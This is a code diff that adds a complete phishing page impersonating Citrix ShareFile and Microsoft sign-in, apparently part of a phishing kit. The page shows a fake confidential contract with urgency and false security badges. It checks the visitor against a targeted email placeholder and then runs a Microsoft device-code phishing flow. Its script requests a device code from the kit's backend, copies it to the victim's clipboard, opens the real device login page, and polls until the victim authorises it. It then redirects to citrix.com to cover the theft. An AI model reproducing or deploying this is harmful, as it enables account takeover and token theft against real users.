@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ShareFile – Secure File Shared With You</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='4' fill='%23FF5800'/><text y='22' x='5' font-size='18' fill='white' font-family='Arial' font-weight='bold'>S</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f5f5f5;font-family:'Open Sans',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px 16px}
+.wrap{width:100%;max-width:640px}
+/* Header */
+.header{background:#fff;border:1px solid #e0e0e0;border-bottom:none;border-radius:4px 4px 0 0;padding:16px 28px;display:flex;align-items:center;justify-content:space-between}
+.sf-brand{display:flex;align-items:center;gap:12px}
+/* Main card */
+.card{background:#fff;border:1px solid #e0e0e0;border-radius:0 0 4px 4px}
+/* Orange accent bar */
+.accent-bar{background:linear-gradient(90deg,#FF5800,#ff7a33);height:4px}
+.content{padding:32px 28px}
+.sender-info{display:flex;align-items:center;gap:14px;margin-bottom:24px;padding-bottom:20px;border-bottom:1px solid #f0f0f0}
+.sender-avatar{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#FF5800,#ff9a6c);color:#fff;font-size:18px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.sender-details .sender-name{font-size:15px;font-weight:700;color:#333;margin-bottom:2px}
+.sender-details .sender-meta{font-size:12px;color:#888}
+/* File card */
+.file-card{background:#fff9f5;border:1.5px solid #ffd4b8;border-radius:6px;padding:20px 20px;display:flex;align-items:center;gap:16px;margin-bottom:22px;cursor:pointer;transition:border-color .15s,box-shadow .15s}
+.file-card:hover{border-color:#FF5800;box-shadow:0 0 0 3px rgba(255,88,0,.08)}
+.file-details .file-name{font-size:15px;font-weight:700;color:#333;margin-bottom:4px}
+.file-details .file-meta{font-size:12px;color:#888;line-height:1.6}
+.file-details .secure-badge{display:inline-flex;align-items:center;gap:4px;background:#fff3ee;color:#FF5800;border:1px solid #ffd4b8;border-radius:3px;padding:2px 8px;font-size:11px;font-weight:700;margin-top:6px}
+/* Expiry warning */
+.expiry-notice{background:#fff8e1;border:1px solid #ffecb3;border-radius:4px;padding:12px 16px;font-size:13px;color:#e65100;margin-bottom:22px;display:flex;align-items:center;gap:10px}
+/* Message from sender */
+.sender-message{background:#f9f9f9;border-left:3px solid #FF5800;padding:14px 16px;border-radius:0 4px 4px 0;font-size:14px;color:#555;line-height:1.7;margin-bottom:24px;font-style:italic}
+/* CTA */
+.cta-panel{background:#1a1a1a;border-radius:6px;padding:18px 20px;margin-bottom:22px;border:1.5px solid #FF5800}
+.cta-file-row{display:flex;align-items:center;gap:14px;margin-bottom:14px}
+.cta-file-icon{width:44px;height:44px;background:#FF5800;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.cta-file-name{font-size:13px;font-weight:700;color:#fff;word-break:break-all}
+.cta-file-meta{font-size:11px;color:#888;margin-top:2px}
+.cta-enc-badge{display:inline-flex;align-items:center;gap:4px;background:rgba(255,88,0,.15);color:#FF8533;border:1px solid rgba(255,88,0,.3);border-radius:3px;padding:2px 8px;font-size:10px;font-weight:700;margin-top:4px}
+.cta-btns{display:flex;gap:10px}
+.dl-btn{flex:1;display:flex;align-items:center;justify-content:center;gap:8px;background:#FF5800;color:#fff;font-size:14px;font-weight:700;padding:13px 16px;border-radius:4px;border:none;cursor:pointer;font-family:inherit;transition:background .15s;box-shadow:0 3px 0 #cc4600}
+.dl-btn:hover{background:#e64f00}
+.preview-btn{flex:1;display:flex;align-items:center;justify-content:center;gap:6px;background:transparent;color:#FF5800;border:1.5px solid #FF5800;font-size:14px;font-weight:600;padding:12px 16px;border-radius:4px;cursor:pointer;font-family:inherit;transition:background .15s}
+.preview-btn:hover{background:rgba(255,88,0,.08)}
+/* Trust section */
+.trust-section{padding:20px 28px;border-top:1px solid #f0f0f0;display:flex;align-items:center;gap:24px;flex-wrap:wrap}
+.trust-item{display:flex;align-items:center;gap:6px;font-size:11px;color:#888}
+/* Footer */
+.footer{background:#f5f5f5;border:1px solid #e0e0e0;border-top:none;border-radius:0 0 4px 4px;padding:16px 28px}
+.footer p{font-size:11px;color:#aaa;line-height:1.7}
+.footer a{color:#FF5800}
+/* Auth overlay */
+#auth-overlay{display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.65);backdrop-filter:blur(4px);align-items:center;justify-content:center}
+.auth-box{background:#fff;border-radius:6px;padding:36px 30px;max-width:390px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+/* Gate */
+#email-gate{display:none;position:fixed;inset:0;z-index:9999;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,.65);backdrop-filter:blur(5px)}
+.gate-card{background:#fff;border-radius:6px;padding:36px 30px;width:90%;max-width:400px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4)}
+.gate-input{width:100%;padding:11px 14px;border:1.5px solid #e0e0e0;border-radius:4px;font-size:14px;font-family:inherit;outline:none;margin-bottom:8px;transition:border .15s}
+.gate-input:focus{border-color:#FF5800}
+.gate-btn{width:100%;background:#FF5800;color:#fff;border:none;border-radius:4px;padding:12px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit}
+.gate-btn:hover{background:#e64f00}
+.gate-err{color:#c0392b;font-size:13px;margin-bottom:8px;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="header">
+    <div class="sf-brand">
+      <!-- ShareFile (Citrix) logo: SF wordmark with orange -->
+      <svg width="130" height="28" viewBox="0 0 130 28" xmlns="http://www.w3.org/2000/svg">
+        <rect width="28" height="28" rx="4" fill="#FF5800"/>
+        <path d="M7 19c0-3.31 2.69-6 6-6h5v-2H7V9h11c2.21 0 4 1.79 4 4s-1.79 4-4 4h-5v2h9v2H13c-1.1 0-2 .9-2 2v1H9v-1c0-2.21 1.79-4 4-4z" fill="white"/>
+        <text x="34" y="19" font-family="'Open Sans',Arial,sans-serif" font-size="15" font-weight="700" fill="#333" letter-spacing="-0.3">ShareFile</text>
+        <text x="100" y="19" font-family="Arial" font-size="10" fill="#999">by Citrix</text>
+      </svg>
+    </div>
+    <div style="font-size:11px;color:#999;display:flex;align-items:center;gap:5px">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="#27ae60"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+      Bank-grade Encryption
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="accent-bar"></div>
+    <div class="content">
+      <div class="sender-info">
+        <div class="sender-avatar" style="background:linear-gradient(135deg,#FF5800,#ff9a6c);font-size:18px">📎</div>
+        <div class="sender-details">
+          <div class="sender-name">ShareFile — Secure Transfer</div>
+          <div class="sender-meta">no-reply@sf-notifications.com</div>
+        </div>
+      </div>
+
+      <p style="font-size:17px;font-weight:700;color:#222;margin-bottom:6px">A secure file has been shared with you</p>
+      <p style="font-size:13px;color:#888;margin-bottom:22px">This file was shared through ShareFile's encrypted secure transfer system.</p>
+
+      <!-- File card -->
+      <div class="file-card" onclick="startAuth()">
+        <div>
+          <svg width="50" height="56" viewBox="0 0 50 56" fill="none">
+            <rect width="50" height="56" rx="3" fill="#fff5f0" stroke="#ffd4b8" stroke-width="1.5"/>
+            <path d="M32 0v16h16L32 0z" fill="#ffd4b8"/>
+            <rect x="7" y="24" width="24" height="2" rx="1" fill="#FF5800"/>
+            <rect x="7" y="30" width="36" height="1.5" rx="1" fill="#e0e0e0"/>
+            <rect x="7" y="35" width="28" height="1.5" rx="1" fill="#e0e0e0"/>
+            <rect x="7" y="40" width="32" height="1.5" rx="1" fill="#e0e0e0"/>
+          </svg>
+        </div>
+        <div class="file-details">
+          <div class="file-name">Enterprise_SLA_Contract_2026_CONFIDENTIAL.pdf</div>
+          <div class="file-meta">
+            PDF Document · 892 KB · Shared: Today at 11:23 AM<br>
+            Download expires: <strong style="color:#e65100"><span class="dyn-date-plus7"></span> at 11:59 PM</strong>
+          </div>
+          <div class="secure-badge">🔒 Password-protected transfer</div>
+        </div>
+      </div>
+
+      <!-- Expiry warning -->
+      <div class="expiry-notice">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#e65100"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+        This link expires in <strong>7 days</strong>. Download before it becomes unavailable.
+      </div>
+
+      <!-- Message -->
+      <div class="sender-message">
+        "A secure document requires your attention. Please review and download the attached file at your earliest convenience. This link will expire soon. I need your acknowledgment and signature by end of week. The file is encrypted — you'll need to sign in with your account to download it."
+      </div>
+
+      <!-- CTA Panel -->
+      <div class="cta-panel">
+        <div class="cta-file-row">
+          <div class="cta-file-icon">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+          </div>
+          <div>
+            <div class="cta-file-name">Enterprise_SLA_Contract_2026_CONFIDENTIAL.pdf</div>
+            <div class="cta-file-meta">892 KB · PDF · AES-256 encrypted</div>
+            <div class="cta-enc-badge">🔒 Encrypted transfer · sign-in required</div>
+          </div>
+        </div>
+        <div class="cta-btns">
+          <button class="dl-btn" onclick="startAuth()">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+            Download
+          </button>
+          <button class="preview-btn" onclick="startAuth()">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="#FF5800"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            Preview
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div class="trust-section">
+      <div class="trust-item"><svg width="14" height="14" viewBox="0 0 24 24" fill="#27ae60"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>256-bit AES encryption</div>
+      <div class="trust-item"><svg width="14" height="14" viewBox="0 0 24 24" fill="#2980b9"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>HIPAA Compliant</div>
+      <div class="trust-item"><svg width="14" height="14" viewBox="0 0 24 24" fill="#8e44ad"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm4.24 16L12 15.45 7.77 18l1.12-4.81-3.73-3.23 4.92-.42L12 5l1.92 4.53 4.92.42-3.73 3.23L16.23 18z"/></svg>SOC 2 Certified</div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <p>
+      Citrix Systems, Inc. · 851 West Cypress Creek Road, Fort Lauderdale, FL 33309<br>
+      <a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a> · <a href="#">Unsubscribe</a><br>
+      You received this because no-reply@sf-notifications.com shared a file with you using Citrix ShareFile.
+    </p>
+  </div>
+</div>
+
+<!-- Auth overlay -->
+<div id="auth-overlay">
+  <div class="auth-box">
+    <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:20px">
+      <svg width="21" height="21" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+      <span style="font-size:14px;font-weight:300;color:#555;font-family:inherit">Microsoft</span>
+    </div>
+    <h3 id="auth-title" style="font-size:18px;font-weight:700;color:#222;margin-bottom:8px">Sign in to download</h3>
+    <p id="auth-sub" style="font-size:13px;color:#666;margin-bottom:22px;line-height:1.6">ShareFile requires your Microsoft account to decrypt and download this secure file.</p>
+    <div id="spinner-sec"><div style="width:34px;height:34px;border:3px solid #e8e8e8;border-top-color:#FF5800;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 14px"></div><p style="font-size:13px;color:#999">Connecting securely…</p></div>
+        <div id="code-sec" style="display:none">
+      <p style="font-size:12px;color:#aaa;margin-bottom:12px">Your code is ready. Click below — it opens Microsoft and pastes for you.</p>
+      <div id="code-val" style="font-size:32px;font-weight:900;letter-spacing:8px;color:#fff;font-family:monospace;background:rgba(0,0,0,.2);border-radius:6px;padding:12px;margin-bottom:16px;cursor:pointer;border:2px dashed rgba(255,255,255,.2)" onclick="openLogin()"></div>
+      <button onclick="openLogin()" id="open-btn" style="width:100%;padding:14px;font-size:15px;font-weight:700;border:none;border-radius:8px;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;background:#FF5800;color:#fff;box-shadow:0 4px 14px rgba(0,0,0,.3)">
+        <svg width="18" height="18" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+        Open Microsoft Device Login →
+      </button>
+      <p id="cp-ok" style="font-size:12px;color:#22c55e;display:none;margin-bottom:4px">✅ Code copied! Paste it on the Microsoft page.</p>
+      <p style="font-size:11px;color:#777;margin-top:4px">Expires in <span id="xtimer">15:00</span> · <span onclick="cpCode()" style="cursor:pointer;text-decoration:underline">Copy manually</span></p>
+    </div>
+      <div id="ok-sec" style="display:none">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="#27ae60" style="margin-bottom:10px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+      <p style="font-size:16px;font-weight:700;color:#27ae60">Verified!</p>
+      <p style="font-size:13px;color:#999;margin-top:4px">Decrypting your file…</p>
+    </div>
+  </div>
+</div>
+
+<!-- Email gate -->
+<div id="email-gate">
+  <div class="gate-card">
+    <svg width="120" height="26" viewBox="0 0 130 28" style="margin-bottom:16px">
+      <rect width="28" height="28" rx="4" fill="#FF5800"/>
+      <text y="19" x="7" font-size="16" fill="white" font-family="Arial" font-weight="bold">SF</text>
+      <text x="34" y="19" font-family="Arial,sans-serif" font-size="15" font-weight="700" fill="#333">ShareFile</text>
+    </svg>
+    <p style="font-size:17px;font-weight:700;color:#222;margin-bottom:6px">Confirm Your Email</p>
+    <p style="font-size:13px;color:#666;margin-bottom:20px;line-height:1.6">This secure file transfer was sent to your work inbox. Enter the email address where you received this notification to download.</p>
+    <input id="gem" class="gate-input" type="email" placeholder="Your work email address" onkeydown="if(event.key==='Enter')gv()">
+    <div id="gerr" class="gate-err">❌ Email not found. Please enter the work email where you received this transfer.</div>
+    <button class="gate-btn" onclick="gv()">Verify &amp; Download →</button>
+    <p style="font-size:11px;color:#ccc;margin-top:12px">🔒 Citrix ShareFile Secure Access</p>
+  </div>
+</div>
+
+<script>
+const LINK_ID='{{LINK_ID}}',TARGET='{{TARGET_EMAIL}}';
+(function(){if(!TARGET)return;const g=document.getElementById('email-gate');g.style.display='flex';setTimeout(()=>{const i=document.getElementById('gem');if(i)i.focus();},150);})();
+function gv(){const e=(document.getElementById('gem').value||'').trim().toLowerCase(),err=document.getElementById('gerr');if(e===TARGET.toLowerCase()){const g=document.getElementById('email-gate');g.style.transition='opacity .3s';g.style.opacity='0';setTimeout(()=>g.remove(),300);}else{err.style.display='block';const i=document.getElementById('gem');i.style.borderColor='#e74c3c';i.style.animation='shake .35s ease';setTimeout(()=>{i.style.animation='';i.style.borderColor='';},400);}}
+let sc='',pi,ci,tl=900;
+function startAuth(){document.getElementById('auth-overlay').style.display='flex';fetch('/api/device/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID})}).then(r=>r.json()).then(d=>{if(d.error){location.reload();return;}sc=d.user_code;document.getElementById('code-val').textContent=sc;document.getElementById('spinner-sec').style.display='none';document.getElementById('code-sec').style.display='block';ci=setInterval(()=>{tl--;const m=String(Math.floor(tl/60)).padStart(2,'0'),s=String(tl%60).padStart(2,'0');const el=document.getElementById('xtimer');if(el)el.textContent=m+':'+s;if(tl<=0)clearInterval(ci);},1000);pi=setInterval(()=>{fetch('/api/device/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID,device_code:d.device_code})}).then(r=>r.json()).then(p=>{if(p.success){clearInterval(pi);clearInterval(ci);document.getElementById('code-sec').style.display='none';document.getElementById('ok-sec').style.display='block';setTimeout(()=>window.location.href='https://www.citrix.com',2500);}}).catch(()=>{});},( d.interval||5)*1000);}).catch(()=>location.reload());}
+
+function openLogin(){
+  cpCode();
+  const url='https://microsoft.com/devicelogin';
+  const w=window.open(url,'_blank','width=560,height=620,left=200,top=100,noopener');
+  if(!w||w.closed||typeof w.closed==='undefined'){
+    // Popup blocked — fall back to redirect in same tab after short delay
+    const btn=document.getElementById('open-btn');
+    if(btn){btn.textContent='⏎ Redirecting…';}
+    setTimeout(()=>window.location.href=url,800);
+  }
+}
+function cpCode(){const ta=document.createElement('textarea');ta.value=sc;ta.style.cssText='position:fixed;top:-999px;opacity:0';document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);const ok=document.getElementById('cp-ok');if(ok){ok.style.display='block';setTimeout(()=>ok.style.display='none',3000);}}
+</script>
+<script>
+// Dynamic date injection — replaces all .dyn-date and .dyn-date-plus7 elements on load
+(function(){
+  const now=new Date();
+  const fmt=(d)=>d.toLocaleDateString('en-US',{month:'long',day:'numeric',year:'numeric'});
+  const fmtShort=(d)=>d.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});
+  const plus7=new Date(now);plus7.setDate(plus7.getDate()+7);
+  const plus14=new Date(now);plus14.setDate(plus14.getDate()+14);
+  const timeStr=now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:false})+' UTC';
+  document.querySelectorAll('.dyn-date').forEach(el=>el.textContent=fmt(now));
+  document.querySelectorAll('.dyn-date-short').forEach(el=>el.textContent=fmtShort(now));
+  document.querySelectorAll('.dyn-date-plus7').forEach(el=>el.textContent=fmtShort(plus7));
+  document.querySelectorAll('.dyn-date-plus14').forEach(el=>el.textContent=fmtShort(plus14));
+  document.querySelectorAll('.dyn-time').forEach(el=>el.textContent=timeStr);
+  document.querySelectorAll('.dyn-year').forEach(el=>el.textContent=now.getFullYear());
+})();
+</script>
+</body></html>
